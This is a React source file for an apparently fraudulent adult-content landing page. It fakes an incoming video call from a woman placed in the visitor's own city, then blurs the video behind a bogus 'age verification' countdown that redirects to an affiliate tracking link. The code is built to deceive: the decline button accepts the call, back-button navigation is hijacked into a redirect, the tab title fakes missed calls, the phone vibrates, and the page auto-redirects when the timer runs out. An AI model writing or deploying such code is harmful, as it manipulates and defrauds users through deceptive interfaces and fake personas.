"use client";

import React, { useState, useEffect, useRef, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { 
  PhoneCall, 
  PhoneOff, 
  Video, 
  MicOff, 
  Lock, 
  AlertTriangle,
  ChevronUp
} from "lucide-react";
import { DRTUBER_FALLBACK_VIDEOS } from "@/lib/drtuber_fallback";

interface InteractiveVaultClientProps {
  country: string;
  city: string;
  isBot: boolean;
  clickId?: string;
  zoneId?: string;
  initialVideos?: any[];
  variant?: "A" | "B";
}

const NAMES_BY_LANG: Record<string, string[]> = {
  es: ["Sofia", "Valentina", "Camila", "Lucia", "Mia", "Martina", "Elena"],
  en: ["Chloe", "Emma", "Olivia", "Ava", "Sophia", "Isabella", "Mia"],
  fr: ["Léa", "Alice", "Chloé", "Emma", "Inès", "Sarah", "Juliette"],
  ja: ["Sakura", "Hina", "Yua", "Mei", "Aoi", "Rin", "Rio"],
  it: ["Giulia", "Aurora", "Alice", "Ginevra", "Emma", "Giorgia", "Martina"],
  pt: ["Maria", "Ana", "Beatriz", "Mariana", "Julia", "Sofia", "Camila"],
  sl: ["Nina", "Sara", "Ana", "Lara", "Eva", "Nika", "Maja"],
  da: ["Ida", "Emma", "Clara", "Freja", "Sofia", "Laura", "Anna"]
};

const tzToCountryMap: Record<string, string> = {
  "santo_domingo": "DO",
  "madrid": "ES",
  "mexico_city": "MX",
  "monterrey": "MX",
  "tijuana": "MX",
  "bogota": "CO",
  "buenos_aires": "AR",
  "santiago": "CL",
  "lima": "PE",
  "caracas": "VE",
  "quito": "EC",
  "montevideo": "UY",
  "asuncion": "PY",
  "la_paz": "BO",
  "guatemala": "GT",
  "san_jose": "CR",
  "tegucigalpa": "HN",
  "managua": "NI",
  "san_salvador": "SV",
  "panama": "PA",
  "san_juan": "PR",
  "ljubljana": "SI",
  "copenhagen": "DK"
};

export function InteractiveVaultClient({ country, city, clickId, initialVideos, variant = "B" }: InteractiveVaultClientProps) {
  const [appState, setAppState] = useState<"feed" | "incoming_call" | "call_active" | "paywall">("feed");
  const [swipeCount, setSwipeCount] = useState(0);
  const [displayCity, setDisplayCity] = useState(city);
  const [detectedLang, setDetectedLang] = useState<string>("es");
  const [currentVideoIdx, setCurrentVideoIdx] = useState(0);
  const [isAudioAllowed, setIsAudioAllowed] = useState(false);
  const [callerName, setCallerName] = useState("Mia");
  const [paywallTimer, setPaywallTimer] = useState(45);

  const containerRef = useRef<HTMLDivElement>(null);
  const ringAudioRef = useRef<HTMLAudioElement | null>(null);
  const voiceAudioRef = useRef<HTMLAudioElement | null>(null);

  const videos = (initialVideos && initialVideos.length >= 3) 
    ? initialVideos 
    : DRTUBER_FALLBACK_VIDEOS;

  // City, Language Detection & Audio Init
  useEffect(() => {
    if (typeof window !== "undefined") {
      const mainLang = (window.navigator.language || "").split("-")[0].toLowerCase();
      const supported = ["es", "en", "fr", "ja", "it", "pt", "sl", "da"];
      const lang = supported.includes(mainLang) ? mainLang : "es";
      setDetectedLang(lang);
      
      const langNames = NAMES_BY_LANG[lang] || NAMES_BY_LANG.es;
      setCallerName(langNames[Math.floor(Math.random() * langNames.length)]);

      // Initialize audio objects
      ringAudioRef.current = new Audio("/sounds/ringtone.wav");
      ringAudioRef.current.loop = true;
      voiceAudioRef.current = new Audio("/sounds/muffled_voice.wav");
      voiceAudioRef.current.loop = true;
    }

    const isGeneric = !city || city.toLowerCase().includes("tu área") || city.toLowerCase().includes("your area");
    if (isGeneric) {
      try {
        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        if (tz && tz.includes("/")) {
          const cityPart = tz.split("/")[1];
          const cleanedCity = cityPart.replace(/_/g, " ").split(" ").map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(" ");
          if (cleanedCity) setDisplayCity(cleanedCity);
        }
      } catch (e) {}
    } else {
      setDisplayCity(city);
    }
  }, [city]);

  const translationsDict: Record<string, any> = {
    es: {
      swipeToExplore: "Desliza para ver más chicas",
      incomingCall: `${callerName} (${displayCity}) quiere videochat...`,
      answer: "Aceptar",
      decline: "Rechazar",
      connecting: "Conectando cámara segura...",
      paywallTitle: "⚠️ CÁMARA PRIVADA BLOQUEADA",
      paywallDesc: `La conexión privada se cortará en 00:${paywallTimer.toString().padStart(2, "0")}. Verifica tu edad (18+) rápidamente para quitar la censura.`,
      paywallBtn: "VERIFICAR EDAD Y QUITAR CENSURA",
      tabBlink1: "⚠️ LLAMADA PERDIDA",
      tabBlink2: "📲 Alguien te llama...",
    },
    en: {
      swipeToExplore: "Swipe to explore girls",
      incomingCall: `${callerName} from ${displayCity} wants to videochat...`,
      answer: "Answer",
      decline: "Decline",
      connecting: "Connecting secure camera...",
      paywallTitle: "⚠️ PRIVATE CAMERA LOCKED",
      paywallDesc: `The private connection will drop in 00:${paywallTimer.toString().padStart(2, "0")}. Verify your age (18+) quickly to unblur.`,
      paywallBtn: "VERIFY AGE & UNBLUR",
      tabBlink1: "⚠️ MISSED CALL",
      tabBlink2: "📲 Someone is calling...",
    },
    fr: {
      swipeToExplore: "Glissez pour explorer plus de filles",
      incomingCall: `${callerName} (${displayCity}) veut faire un appel vidéo...`,
      answer: "Accepter",
      decline: "Refuser",
      connecting: "Connexion à la caméra sécurisée...",
      paywallTitle: "⚠️ CAMÉRA PRIVÉE VERROUILLÉE",
      paywallDesc: `La connexion privée sera coupée dans 00:${paywallTimer.toString().padStart(2, "0")}. Vérifiez votre âge (18+) rapidement pour retirer la censure.`,
      paywallBtn: "VÉRIFIER L'ÂGE ET RETIRER LA CENSURE",
      tabBlink1: "⚠️ APPEL MANQUÉ",
      tabBlink2: "📲 Quelqu'un appelle...",
    },
    ja: {
      swipeToExplore: "スワイプして女の子を探す",
      incomingCall: `${callerName} (${displayCity}) がビデオ通話を求めています...`,
      answer: "応答",
      decline: "拒否",
      connecting: "安全なカメラに接続中...",
      paywallTitle: "⚠️ プライベートカメラがロックされました",
      paywallDesc: `プライベート接続は 00:${paywallTimer.toString().padStart(2, "0")} に切断されます。モザイクを解除するにはすぐに年齢（18歳以上）を確認してください。`,
      paywallBtn: "年齢を確認してモザイクを解除",
      tabBlink1: "⚠️ 不在着信",
      tabBlink2: "📲 着信中...",
    },
    it: {
      swipeToExplore: "Scorri per esplorare più ragazze",
      incomingCall: `${callerName} (${displayCity}) vuole fare una videochiamata...`,
      answer: "Rispondi",
      decline: "Rifiuta",
      connecting: "Connessione alla telecamera sicura...",
      paywallTitle: "⚠️ TELECAMERA PRIVATA BLOCCATA",
      paywallDesc: `La connessione privata si interromperà in 00:${paywallTimer.toString().padStart(2, "0")}. Verifica rapidamente la tua età (18+) per rimuovere la censura.`,
      paywallBtn: "VERIFICA L'ETÀ E RIMUOVI CENSURA",
      tabBlink1: "⚠️ CHIAMATA PERSA",
      tabBlink2: "📲 Qualcuno sta chiamando...",
    },
    pt: {
      swipeToExplore: "Deslize para ver mais garotas",
      incomingCall: `${callerName} (${displayCity}) quer fazer uma chamada de vídeo...`,
      answer: "Atender",
      decline: "Recusar",
      connecting: "Conectando câmera segura...",
      paywallTitle: "⚠️ CÂMERA PRIVADA BLOQUEADA",
      paywallDesc: `A conexão privada será encerrada em 00:${paywallTimer.toString().padStart(2, "0")}. Verifique sua idade (18+) rapidamente para remover a censura.`,
      paywallBtn: "VERIFICAR IDADE E REMOVER CENSURA",
      tabBlink1: "⚠️ CHAMADA PERDIDA",
      tabBlink2: "📲 Alguém está ligando...",
    },
    sl: {
      swipeToExplore: "Povlecite za raziskovanje več deklet",
      incomingCall: `${callerName} (${displayCity}) želi video klepet...`,
      answer: "Sprejmi",
      decline: "Zavrni",
      connecting: "Povezovanje varne kamere...",
      paywallTitle: "⚠️ ZASEBNA KAMERA ZAKLENJENA",
      paywallDesc: `Zasebna povezava bo prekinjena čez 00:${paywallTimer.toString().padStart(2, "0")}. Hitro preverite svojo starost (18+), da odstranite cenzuro.`,
      paywallBtn: "PREVERI STAROST IN ODSTRANI CENZURO",
      tabBlink1: "⚠️ ZAMUJEN KLIC",
      tabBlink2: "📲 Nekdo vas kliče...",
    },
    da: {
      swipeToExplore: "Swipe for at udforske flere piger",
      incomingCall: `${callerName} (${displayCity}) vil videochatte...`,
      answer: "Besvar",
      decline: "Afvis",
      connecting: "Opretter forbindelse til sikker kamera...",
      paywallTitle: "⚠️ PRIVAT KAMERA LÅST",
      paywallDesc: `Den private forbindelse afbrydes om 00:${paywallTimer.toString().padStart(2, "0")}. Bekræft hurtigt din alder (18+) for at fjerne censuren.`,
      paywallBtn: "BEKRÆFT ALDER OG FJERN CENSUR",
      tabBlink1: "⚠️ UBESVARET OPKALD",
      tabBlink2: "📲 Nogen ringer...",
    }
  };

  const t = translationsDict[detectedLang] || translationsDict.es;

  // BeMob Link Generation with A/B Variant tracking
  const getDecryptedLink = useCallback(() => {
    let token = "";
    let isBeMobTok = false;

    if (typeof window !== "undefined") {
      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.get("beMobTok")) {
        token = urlParams.get("beMobTok") || "";
        isBeMobTok = true;
      } else {
        token = urlParams.get("cid") || urlParams.get("click") || urlParams.get("clickId") || "";
      }
    }
    
    if (!token && clickId) {
      token = clickId;
      isBeMobTok = true;
    }

    const baseUrl = "https://tlgpmrg.heartledbeau.org/nzchv5g";
    let link = baseUrl;
    if (token) {
      link = isBeMobTok ? `${baseUrl}?beMobTok=${token}` : `${baseUrl}?cid=${token}`;
    }
    const paramChar = link.includes('?') ? '&' : '?';
    return `${link}${paramChar}v=${variant}`;
  }, [clickId, variant]);

  const handleRedirect = useCallback(() => {
    window.location.replace(getDecryptedLink());
  }, [getDecryptedLink]);

  // CRO: Back-button hijack
  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => handleRedirect();
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [handleRedirect]);

  // CRO: Tab Blinker
  useEffect(() => {
    const originalTitle = document.title;
    let interval: NodeJS.Timeout | null = null;
    const handleVis = () => {
      if (document.hidden && (appState === "incoming_call" || appState === "paywall")) {
        let flag = false;
        interval = setInterval(() => {
          document.title = flag ? t.tabBlink1 : t.tabBlink2;
          flag = !flag;
        }, 1000);
      } else {
        if (interval) clearInterval(interval);
        document.title = originalTitle;
      }
    };
    document.addEventListener("visibilitychange", handleVis);
    return () => {
      if (interval) clearInterval(interval);
      document.removeEventListener("visibilitychange", handleVis);
    };
  }, [appState, t.tabBlink1, t.tabBlink2]);

  // Audio and Vibration Handling
  useEffect(() => {
    if (appState === "incoming_call") {
      if (typeof navigator !== "undefined" && navigator.vibrate) {
        navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500]);
      }
      ringAudioRef.current?.play().catch(() => {});
    } else if (appState === "call_active" || appState === "paywall") {
      if (typeof navigator !== "undefined" && navigator.vibrate) navigator.vibrate(0);
      ringAudioRef.current?.pause();
      if (appState === "paywall") {
        voiceAudioRef.current?.play().catch(() => {});
      }
    }
    
    return () => {
      if (typeof navigator !== "undefined" && navigator.vibrate) navigator.vibrate(0);
      ringAudioRef.current?.pause();
      voiceAudioRef.current?.pause();
    };
  }, [appState]);

  // Paywall Countdown & Auto-redirect
  useEffect(() => {
    if (appState === "paywall" && paywallTimer > 0) {
      const interval = setInterval(() => {
        setPaywallTimer(prev => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    } else if (appState === "paywall" && paywallTimer === 0) {
      handleRedirect();
    }
  }, [appState, paywallTimer, handleRedirect]);

  // Auto-trigger the call after 5 seconds if they haven't swiped
  useEffect(() => {
    if (appState === "feed") {
      const timer = setTimeout(() => {
        setAppState("incoming_call");
      }, 5000);
      return () => clearTimeout(timer);
    }
  }, [appState]);

  // Handle Swipe logic
  const handleSwipe = () => {
    setIsAudioAllowed(true); 
    if (swipeCount >= 2) {
      setAppState("incoming_call");
    } else {
      setSwipeCount(c => c + 1);
      setCurrentVideoIdx(i => (i + 1) % videos.length);
    }
  };

  const handleAcceptCall = () => {
    setIsAudioAllowed(true);
    setAppState("call_active");
    setTimeout(() => {
      setAppState("paywall");
    }, 1500); 
  };

  const handleDeclineCall = () => {
    handleAcceptCall();
  };

  const activeVideo = videos[currentVideoIdx];

  return (
    <div className="fixed inset-0 w-full h-full bg-black text-white overflow-hidden flex flex-col font-sans" onClick={() => setIsAudioAllowed(true)}>
      {/* Background Video Layer */}
      <div className="absolute inset-0 w-full h-full z-0">
        <AnimatePresence mode="wait">
          <motion.div 
            key={currentVideoIdx}
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -50 }}
            transition={{ duration: 0.3 }}
            className="w-full h-full"
          >
            {activeVideo?.videoPreviewUrl ? (
              <video 
                src={activeVideo.videoPreviewUrl} 
                autoPlay 
                loop 
                muted={!isAudioAllowed || appState === "paywall"} 
                playsInline 
                className={`w-full h-full object-cover transition-all duration-700 ${
                  appState === "incoming_call" ? "brightness-50 blur-sm scale-105" : 
                  appState === "paywall" ? "brightness-75 blur-[25px] scale-110 saturate-150" : 
                  "brightness-100 blur-0"
                }`}
              />
            ) : (
              <img src={activeVideo?.thumbnailUrl || ""} alt="BG" className="w-full h-full object-cover" />
            )}
          </motion.div>
        </AnimatePresence>
      </div>

      {/* Layer 1: Feed Interface */}
      <AnimatePresence>
        {appState === "feed" && (
          <motion.div 
            className="absolute inset-0 z-10 flex flex-col justify-end pb-24 px-4"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            onClick={handleSwipe}
          >
            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 flex flex-col items-center gap-2 opacity-50 animate-pulse pointer-events-none">
              <ChevronUp className="w-12 h-12" />
              <span className="text-sm font-semibold tracking-widest uppercase shadow-black drop-shadow-md">{t.swipeToExplore}</span>
            </div>
            <div className="bg-gradient-to-t from-black via-black/50 to-transparent absolute inset-0 bottom-0 h-1/3 pointer-events-none" />
          </motion.div>
        )}
      </AnimatePresence>

      {/* Layer 2: Incoming Call */}
      <AnimatePresence>
        {appState === "incoming_call" && (
          <motion.div 
            className="absolute inset-0 z-20 flex flex-col justify-between pt-16 pb-20 px-8 bg-black/40 backdrop-blur-sm"
            initial={{ y: "100%" }}
            animate={{ y: "0%" }}
            exit={{ opacity: 0, scale: 1.1 }}
            transition={{ type: "spring", damping: 25, stiffness: 200 }}
          >
            <div className="flex flex-col items-center text-center gap-2">
              <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-emerald-500 shadow-[0_0_30px_rgba(16,185,129,0.5)] animate-pulse mb-2">
                <img src={activeVideo?.thumbnailUrl || ""} alt="Caller" className="w-full h-full object-cover" />
              </div>
              <h2 className="text-2xl font-semibold tracking-tight">{callerName}</h2>
              <p className="text-zinc-300 text-sm">{t.incomingCall}</p>
            </div>

            <div className="flex justify-between items-center w-full px-4">
              <div className="flex flex-col items-center gap-2">
                <button 
                  onClick={handleDeclineCall}
                  className="w-16 h-16 rounded-full bg-red-500 flex items-center justify-center animate-bounce shadow-[0_0_20px_rgba(239,68,68,0.4)]"
                >
                  <PhoneOff className="w-7 h-7 fill-white" />
                </button>
                <span className="text-xs text-zinc-300">{t.decline}</span>
              </div>

              <div className="flex flex-col items-center gap-2">
                <button 
                  onClick={handleAcceptCall}
                  className="w-16 h-16 rounded-full bg-emerald-500 flex items-center justify-center animate-bounce shadow-[0_0_30px_rgba(16,185,129,0.6)]"
                  style={{ animationDelay: "0.2s" }}
                >
                  <PhoneCall className="w-7 h-7 fill-white" />
                </button>
                <span className="text-xs font-semibold text-emerald-400">{t.answer}</span>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Layer 3: Call Active (Brief flash of clarity) */}
      <AnimatePresence>
        {appState === "call_active" && (
          <motion.div 
            className="absolute inset-0 z-10 flex items-center justify-center"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
          >
            <span className="text-white/70 font-mono text-sm bg-black/50 px-3 py-1 rounded-full absolute top-8">
              {t.connecting}
            </span>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Layer 4: Paywall (The Blur Hook) */}
      <AnimatePresence>
        {appState === "paywall" && (
          <motion.div 
            className="absolute inset-0 z-30 flex flex-col items-center justify-center p-6 bg-black/40 backdrop-blur-sm"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.4 }}
          >
            <div className="bg-zinc-950/90 border border-rose-500/30 p-8 rounded-3xl shadow-2xl flex flex-col items-center text-center max-w-sm w-full relative overflow-hidden">
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-rose-500 via-purple-500 to-rose-500" />
              
              <div className="w-16 h-16 bg-rose-500/10 rounded-full flex items-center justify-center mb-4">
                <Lock className="w-8 h-8 text-rose-500" />
              </div>
              
              <h3 className="text-xl font-bold mb-2 text-rose-500">{t.paywallTitle}</h3>
              <p className="text-sm text-zinc-300 mb-8 animate-pulse text-rose-400/90 font-medium">{t.paywallDesc}</p>
              
              <button 
                onClick={handleRedirect}
                className="w-full bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-400 hover:to-emerald-500 text-white font-black text-sm py-4 px-6 rounded-xl shadow-[0_0_25px_rgba(16,185,129,0.4)] transition-all flex items-center justify-center gap-2 uppercase tracking-wide animate-pulse"
              >
                <Video className="w-5 h-5" />
                {t.paywallBtn}
              </button>
            </div>
            
            <div className="absolute bottom-10 flex gap-6 text-white/50">
              <MicOff className="w-6 h-6" />
              <Video className="w-6 h-6" />
              <PhoneOff className="w-6 h-6" onClick={handleRedirect} />
            </div>
          </motion.div>
        )}
      </AnimatePresence>

    </div>
  );
}
